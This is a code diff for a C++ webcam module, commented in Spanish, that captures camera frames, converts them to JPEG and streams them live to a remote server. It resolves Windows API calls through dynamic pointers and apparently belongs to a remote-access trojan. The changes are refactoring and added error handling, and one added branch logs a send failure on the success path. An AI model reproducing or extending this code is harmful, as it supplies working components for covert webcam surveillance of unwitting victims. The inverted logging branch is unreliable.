@@ -47,9 +47,7 @@ int mod_Camera::GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
 }
 
 std::vector<BYTE> mod_Camera::bmpHeader(LONG lWidth, LONG lHeight, WORD wBitsPerPixel, const unsigned long& padding_size, DWORD iBuffersize) {
-    //Liberar buffer retornado
-    unsigned long headers_size = sizeof(BITMAPFILEHEADER) +
-        sizeof(BITMAPINFOHEADER);
+    unsigned long headers_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
 
     unsigned long pixel_data_size = lHeight * ((lWidth * (wBitsPerPixel / 8)) + padding_size);
 
@@ -87,13 +85,12 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
     std::vector<BYTE> bJPEGbuffer;
 
     if (!this->GDIPLUS.pGdiplusStartup || !this->KERNEL32.pGlobalAlloc || !this->SHLWAPI.pSHCreateMemStream ||
-        !this->OLE32.pCreateStreamOnHGlobal || !this->GDIPLUS.pGdiplusShutdown ||
-        !this->KERNEL32.pGlobalFree) {
+        !this->OLE32.pCreateStreamOnHGlobal || !this->GDIPLUS.pGdiplusShutdown || !this->GDIPLUS.pGdipCreateBitmapFromStream ||
+        !this->GDIPLUS.pGdipSaveImageToStream || !this->GDIPLUS.pGdipDisposeImage || !this->KERNEL32.pGlobalFree) {
         __DBG_("[X]toJPEG error");
         return bJPEGbuffer;
     }
-    HGLOBAL hGlobalMem = this->KERNEL32.pGlobalAlloc(GHND | GMEM_DDESHARE, 0);
-
+    
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     this->GDIPLUS.pGdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
@@ -101,8 +98,8 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
     GpBitmap *nImage = nullptr;
     GpStatus  statRet;
     STATSTG statstg;
-    IStream* oStream;
-    IStream* nStream;
+    IStream* oStream = nullptr;
+    IStream* nStream = nullptr;
     CLSID   encoderClsid;
     ULONG bytesRead;
     u_int uiBuffS = 0;
@@ -110,39 +107,44 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
 
     HRESULT hr;
 
+    HGLOBAL hGlobalMem = this->KERNEL32.pGlobalAlloc(GHND | GMEM_DDESHARE, 0);
+    
+    if (!hGlobalMem) {
+        error_2("[WEBCAM][X] toJPEG");
+        goto release;
+    }
+
     nStream = this->SHLWAPI.pSHCreateMemStream(bmpBuffer, uiBuffersize);
     if (!nStream) {
-        __DBG_("[X] SHCreateMemStream error");
-        cCliente->m_RemoteLog("[WEBCAM] SHCreateMemStream error : " + std::to_string(GetLastError()));
+        __DBG_("[WEBCAM][X] toJPEG SHCreateMemStream error");
+        //cCliente->m_RemoteLog("[WEBCAM] SHCreateMemStream error : " + std::to_string(GetLastError()));
         goto release;
     }
 
     hr = this->OLE32.pCreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
     if (hr != S_OK) {
-        __DBG_("[X] CreateStreamOnHGlobal error");
-        cCliente->m_RemoteLog("[WEBCAM] CreateStreamOnHGlobal error : " + std::to_string(GetLastError()));
+        __DBG_("[WEBCAM][X] toJPEG CreateStreamOnHGlobal error");
+        //cCliente->m_RemoteLog("[WEBCAM] CreateStreamOnHGlobal error : " + std::to_string(GetLastError()));
         goto release;
     }
 
     nStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
     
     //Crear bitmap a partir de bmpBuffer
-    //GdipCreateBitmapFromStream
     statRet = this->GDIPLUS.pGdipCreateBitmapFromStream(nStream, &nImage);
-    //nImage = this->GDIPLUS.pFromStream(nStream, FALSE);
     if (nImage == nullptr || statRet != GpStatus::Ok) {
-        __DBG_("[X] pGdipCreateBitmapFromStream error");
-        cCliente->m_RemoteLog("[WEBCAM] pGdipCreateBitmapFromStream error : " + std::to_string(GetLastError()));
+        __DBG_("[WEBCAM][X] toJPEG pGdipCreateBitmapFromStream error");
+        //cCliente->m_RemoteLog("[WEBCAM] pGdipCreateBitmapFromStream error : " + std::to_string(GetLastError()));
         goto release;
     }
 
     //Seleccionar encoder jpg para luego guardar el buffer en otro stream
     iRet = this->GetEncoderClsid(L"image/jpeg", &encoderClsid);
     if (iRet == -1) {
-        __DBG_("[X] image/jpeg not found trying PNG...");
+        __DBG_("[WEBCAM][X] toJPEG  image/jpeg not found trying PNG...");
         iRet = this->GetEncoderClsid(L"image/png", &encoderClsid);
         if (iRet == -1) {
-            __DBG_("[X] image/png not found bye...");
+            __DBG_("[WEBCAM][X] toJPEG image/png not found bye...");
             goto release;
         }
     }
@@ -150,13 +152,13 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
     //Guardar el bitmap en un nuevo stream con la conversion a jpg
     statRet = this->GDIPLUS.pGdipSaveImageToStream(nImage, oStream, &encoderClsid, NULL);
     if (statRet != GpStatus::Ok) {
-        __DBG_("[X] pGdipSaveImageToStream");
+        __DBG_("[WEBCAM][X] toJPEG pGdipSaveImageToStream");
         goto release;
     }
 
     hr = oStream->Stat(&statstg, STATFLAG_NONAME);
     if (hr != S_OK) {
-        __DBG_("[X] oStream->Stat");
+        __DBG_("[WEBCAM][X] toJPEG oStream->Stat");
         goto release;
     }
 
@@ -169,18 +171,21 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
     //Obtener bytes jpg de la imagen final
     hr = oStream->Read(bJPEGbuffer.data(), uiBuffS, &bytesRead);
     if (hr != S_OK) {
-        __DBG_("[X] oStream->Read");
+        __DBG_("[WEBCAM][X] toJPEG oStream->Read");
     }
 
     release:
 
-    oStream->Release();
-    nStream->Release();
+    if (oStream) {
+        oStream->Release();
+    }
 
+    if (nStream) {
+        nStream->Release();
+    }
 
     if (nImage) {
-        delete nImage;
-        nImage = nullptr;
+        this->GDIPLUS.pGdipDisposeImage((GpImage*)nImage);
     }
 
     this->GDIPLUS.pGdiplusShutdown(gdiplusToken);
@@ -445,7 +450,7 @@ std::vector<BYTE> mod_Camera::GetFrame(int pIndexDev) {
         !this->MFPLAT.pMFCreateMediaType || !this->MFAPI.pMFSetAttributeSize ||
         !this->MFAPI.pMFSetAttributeRatio || !this->MFPLAT.pMFCreateSample ||
         !this->MFPLAT.pMFCreateMemoryBuffer){
-        __DBG_("[X] mod_cam GetFrame error");
+        __DBG_("[WEBCAM][X] GetFrame error, no estan cargadas las funciones");
         return cBufferOut;
     }
 
@@ -460,9 +465,9 @@ std::vector<BYTE> mod_Camera::GetFrame(int pIndexDev) {
             (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
             0,
             &streamIndex, // Receives the actual stream index.
-            &flags, // Receives the stream flags.
+            &flags,       // Receives the stream flags.
             &llTimeStamp, // Receives the timestamp.
-            &pSample // Receives the sample or NULL.
+            &pSample      // Receives the sample or NULL.
         );
 
         if (FAILED(hr)) {
@@ -592,7 +597,7 @@ std::vector<BYTE> mod_Camera::GetFrame(int pIndexDev) {
                     memcpy(cBufferOut.data(), bmpHeadBuff.data(), iOutSize);
                     memcpy(cBufferOut.data() + iOutSize, pData, currentLength);
                 } else {
-                    __DBG_("[X] No se pudo crear la cabecera bmp");
+                    __DBG_("[WEBCAM][X] GetFrame No se pudo crear la cabecera bmp");
                 }
 
                 pBuffer->Unlock();
@@ -636,7 +641,7 @@ void mod_Camera::LiveCam(int pIndexDev) {
     if (SUCCEEDED(hr)) {
         this->vcCamObjs[pIndexDev].isActivated = this->vcCamObjs[pIndexDev].isLive = true;
 
-        __DBG_("[!]Live iniciado");
+        __DBG_("[WEBCAM][!] LiveCam Live iniciado");
         cCliente->m_RemoteLog("[WEBCAM] Live iniciado");
 
         std::string strHeader = std::to_string(pIndexDev);
@@ -669,6 +674,8 @@ void mod_Camera::LiveCam(int pIndexDev) {
                         if (iSent == -1) {
                             this->vcCamObjs[pIndexDev].isLive = false;
                             break;
+                        }else {
+                            __DBG_("[WEBCAM][X] No se pudo enviar el paquete al servidor");
                         }
                     }
 
@@ -678,6 +685,8 @@ void mod_Camera::LiveCam(int pIndexDev) {
 
         __DBG_("[!]Live terminado");
         cCliente->m_RemoteLog("[WEBCAM] Live finalizado");
+    }else {
+        _DBG_("[CAM][X] No se pudo iniciar la camara", pIndexDev);
     }
 }
 
@@ -693,7 +702,7 @@ mod_Camera::mod_Camera(st_GdiPlus& _gdiplus, st_Shlwapi& _shlwapi, st_Mfplat& _m
     this->MFREADWRITE = _mfreadwrite;
 
     if (this->OLE32.pCoInitialize && this->MFPLAT.pMFStartup) {
-        this->OLE32.pCoInitialize(nullptr);
+        this->OLE32.pCoInitialize(NULL);
         this->MFPLAT.pMFStartup(MF_VERSION, MFSTARTUP_FULL);
     } else {
         __DBG_("[X]mod_cam init error dll");
